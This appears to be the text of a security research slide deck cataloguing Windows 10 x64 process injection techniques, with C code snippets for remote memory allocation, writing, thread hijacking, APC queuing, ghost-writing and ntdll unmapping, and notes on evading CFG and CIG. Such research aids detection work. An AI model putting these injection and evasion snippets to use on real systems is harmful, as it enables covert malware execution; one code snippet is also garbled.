Process Injection Techniques -
Gotta Catch Them All
Amit Klein, VP Security Research
Itzik Kotler, CTO and co-founder
Safebreach Labs
About Itzik Kotler
•
15+ years in InfoSec 
•
CTO & Co-Founder of SafeBreach
•
Presented in Black Hat, DEF CON, HITB, RSA, CCC and more.
•
http://www.ikotler.org
About Amit Klein
•
28 years in InfoSec 
•
VP Security Research Safebreach (2015-Present)
•
30+ Papers, dozens of advisories against high profile products 
•
Presented in BlackHat, DefCon, HITB, NDSS, InfoCom, DSN, RSA, 
CertConf, Bluehat, OWASP Global, OWASP EU, AusCERT and more
•
http://www.securitygalore.com
Why this research?
•
No comprehensive collection/catalog of process injection 
techniques
•
No separation of true injections from process hollowing/spawning
•
No categorization (allocation vs. memory write vs. execution), 
analysis, comparison
•
Update for Windows 10 (latest versions), x64
Kudos and hat-tip
•
Kudos to the following individuals/companies, for 
inventing/developing/documenting/POCing many techniques:
•
Adam of Hexacorn
•
Odzhan
•
EnSilo
•
Csaba Fitzl AKA TheEvilBit
•
And many others…
•
Hat tip to EndGame for providing the first compilation of injection 
techniques.
True process injection
•
True process injection – from live userspace process (malware) to 
live userspace process (target, benign)
•
In contrast to (out of scope):
•
Process spawning and hollowing – spawning the “target” 
process and injecting into it (especially before execution)
•
Pre-execution – e.g. DLL hijacking, AppCert, AppInit, LSP 
providers, Image File Execution Options, etc.
Windows 10, x64
•
Windows 10
•
CFG (Control Flow Guard) – prevent indirect calls to non-approved 
addresses
•
CIG (Code Integrity Guard) - only allow modules signed by 
Microsoft/Microsoft Store/WHQL to be loaded into the process memory
•
x64 (vs. x86)
•
Calling convention – first 4 arguments in (volatile) registers: RCX, RDX, R8, 
R9. Invoking functions (from ROP) necessitates control over some/all these 
registers.
•
No POPA  - writing ROP is more difficult (bootstrapping registers)
The enemy of a good PoC…
HANDLE th = OpenThread(THREAD_SET_CONTEXT| 
THREAD_QUERY_INFORMATION, FALSE, thread_id);
ATOM a = GlobalAddAtomA(payload);
NtQueueApcThread(th, GlobalGetAtomNameA, (PVOID)a, 
(PVOID)(target_payload), (PVOID)(sizeof(payload)));
The scope
•
True process injection
•
Running “sequence” of logic/commands in the target process (not 
just spawning cmd.exe…)
•
Windows 10 version 1803 and above
•
x64 injecting process, x64 target process, both medium integrity
•
Non-admin
•
Evaluation against Windows 10 protections (CFG, CIG)
CFG strategy
•
Disable CFG
•
Standard Windows API SetProcessValidCallTargets() can be 
used to deactivate CFG in the target process (remotely!)
•
Suspicious…
•
May be disabled/restricted in the future
•
Allocate/set executable memory (+making all the allocation CFG-
valid)
•
VirtualAllocEx/VirtualProtectEx
•
Suspicious…
•
Playing by the rules – writing non-executable data (ROP chain), 
and using a CFG-agnostic execution method to run a stack pivot 
gadget (or similar)
•
Difficult…
Other defenses
•
Used to be eliminated from the target process using 
SetProcessMitigationPolicy
•
3 argument function, can be invoked remotely via 
NtQueueApcThread
•
No longer works (1809).
•
CIG is most painful (no loading of arbitrary DLLs)
Typical process injection building blocks
•
Memory allocation
•
May be implicit (cave, stack, …)
•
Page permission issues
•
Control over allocation address?
•
CFG validity?
•
Memory writing
•
Restricted size/charset?
•
Atomic?
•
Execution
•
Target has to be CFG-valid?
•
Control over registers?
•
Limitations/pre-requisites
Process injection techniques
Classic memory allocation technique
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id);
LPVOID target_payload=VirtualAllocEx(h,NULL,sizeof(payload), 
MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
•
Can allocate executable pages
•
For executable pages, Windows automatically sets all the region to 
be CFG-valid
•
Variant – allocating RW pages, then adding X with VirtualProtectEx
The classic WriteProcessMemory
memory writing technique
HANDLE h = OpenProcess(PROCESS_VM_WRITE, FALSE, process_id);
WriteProcessMemory(h, target_payload, payload, sizeof(payload), 
NULL);
•
No prerequisites, no limitations. Address is controlled. 
•
CFG – if the allocation set execution privileges (e.g. VirtualAllocEx), then all the 
region is CFG-valid.
•
CIG – no impact.
The classic CreateRemoteThread
execution technique
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, 
process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE) 
target_execution, RCX, 0, NULL);
•
Pre-requisites – none.
•
CIG – no impact
•
CFG – target_execution should be valid CFG target.
•
Registers – control over RCX
A classic DLL injection execution 
technique
HANDLE h = OpenProcess(PROCESS_CREATE_THREAD, FALSE, process_id);
CreateRemoteThread(h, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, 
target_DLL_path, 0, NULL);
•
Pre-requisites – the DLL is on disk; write-technique used to write the DLL path to 
the target process; DllMain is restricted (loader lock).
•
CFG – no impact
•
CIG – blocks this technique
•
Variant: using QueueUserAPC/NtQueueApcThread
Another classic DLL injection execution 
technique
HMODULE h = LoadLibraryA(dll_path);
HOOKPROC f = (HOOKPROC)GetProcAddress(h, "GetMsgProc"); // GetMessage hook
SetWindowsHookExA(WH_GETMESSAGE, f, h, thread_id);
PostThreadMessage(thread_id, WM_NULL, NULL, NULL); // trigger the hook
•
Pre-requisites – the DLL is on disk, exports e.g. GetMsgProc
•
CFG – no impact
•
CIG – blocks this technique
The classic APC execution technique
HANDLE h = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
QueueUserAPC((LPTHREAD_START_ROUTINE)target_execution, h, RCX);
or
NtQueueApcThread(h, (LPTHREAD_START_ROUTINE)target_execution, RCX, 
RDX, R8D);
•
Pre-requisites – thread must be in alertable state (next slide)
•
CIG – no impact
•
CFG – target_execution should be valid CFG target.
•
Registers – control over RCX (NtQueueApcThread – RCX, RDX, R8D)
Alertable state functions
The following 5 functions (and their low-level syscall wrappers):
•
SleepEx
•
NtDelayExecution
•
WaitForSingleObjectEx
•
NtWaitForSingleObject
•
WaitForMultipleObjectsEx
•
NtWaitForMultipleObjects
•
SignalObjectAndWait
•
NtSignalAndWaitForSingleObject
•
MsgWaitForMultipleObjectsEx (probably RealMsgWaitForMultipleObjectsEx)
•
NtUserMsgWaitForMultipleObjectsEx
Quite common!
Easily detected – RIP at internal function +0x14 (right after SYSCALL)
The classic thread hijacking execution 
technique (SIR)
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
SuspendThread(t);
CONTEXT ctx;
ctx.ContextFlags = CONTEXT_CONTROL;
ctx.Rip = (DWORD64)target_execution;
SetThreadContext(t, &ctx);
ResumeThread(t);
SIR continued
•
Pre-requisites: none.
•
CFG – no impact (!) except RSP
•
Control over registers: no guaranteed control over volatile registers (RAX, RCX, 
RDX, R8-R11). Control over RSP is limited (stack reservation limits).
•
With RW memory (no X):
•
Use write primitive to write ROP chain to the target process
•
Set RIP to a stack pivot gadget to set RSP to the controlled memory
Ghost-writing (monolithic technique)
•
Like thread hijacking, but without the memory writing part…
•
Memory writing is achieved in steps, using SetThreadContext to set registers
•
At the end of each step, the thread is running an infinite loop (success marker)
•
Required ROP gadgets:
•
Sink gadget – infinite loop (JMP -2), marking the successful end of execution
•
Write gadget – e.g. MOV [RDI],RBX; …; RET
•
Stack pivot or equivalent 
•
Step 1: use the write gadget to write the loop gadget into stack
RDI=ctx.rsp, RBX=sink_gadget, RIP=write_gadget
•
Step 2: use the write gadget to write arbitrary memory (infinite loop after each 
QWORD): RDI=address, RBX=data, RSP=ctx.rsp-8, RIP=write_gadget
•
Step 3: execute stack pivot (or equivalent): RSP=new_stack, RIP=rop_gadget
Unused stack as memory - tips
•
Maintain distance from the official TOS (leave room for WinAPI
call stack)
•
Don’t go too far – stack is limited (1MB)
•
Grow (commit) the stack by touching memory at page size (4KB) 
intervals
•
Mind the alignment (16B) when invoking functions
Ghost-writing (contd.)
•
Pre-requisites: writable memory
•
CFG: no impact (!) except RSP
•
CIG: no impact
•
Control over registers (step 3): no guaranteed control over volatile registers 
(RAX, RCX, RDX, R8-R11). Control over RSP is limited (stack reservation limits).
Shared memory writing technique
HANDLE hm = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,section_name);              
BYTE* buf = (BYTE*)MapViewOfFile(hm, FILE_MAP_ALL_ACCESS, 0, 0, section_size);
memcpy(buf+section_size-sizeof(payload), payload, sizeof(payload));
HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
char* read_buf = new char[sizeof(payload)];
SIZE_T region_size;
for (DWORD64 address = 0; address 0, Windows will map to there (but it has 
to be an un-allocated memory).
•
Pre-requisites: none. Limitations: cannot write to allocated memory.
•
CFG – memory allocated with page execution privileges becomes valid CFG 
target!
•
CIG – not relevant
Unmap+rerwrite execution technique
MODULEINFO ntdll_info;
HMODULE ntdll = GetModuleHandleA("ntdll");
GetModuleInformation(GetCurrentProcess(), ntdll, &ntdll_info, sizeof(ntdll_info));
LPVOID ntdll_copy = malloc(ntdll_info.SizeOfImage);
HANDLE p = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION | 
PROCESS_SUSPEND_RESUME, FALSE, process_id);
NtSuspendProcess(p);
ReadProcessMemory(p, ntdll, ntdll_copy, ntdll_info.SizeOfImage, NULL);
… // Patch e.g. NtClose in ntdll_copy
NtUnmapViewOfSection(p, ntdll);
… // Allocate +(Re)write ntdll_copy to address ntdll in target process
FlushInstructionCache(p, ntdll, ntdll_info.SizeOfImage);
NtResumeProcess(p);
(contd.)
•
Pre-requisite: Write technique must be able to allocate (at least) RX pages in a 
specific address
•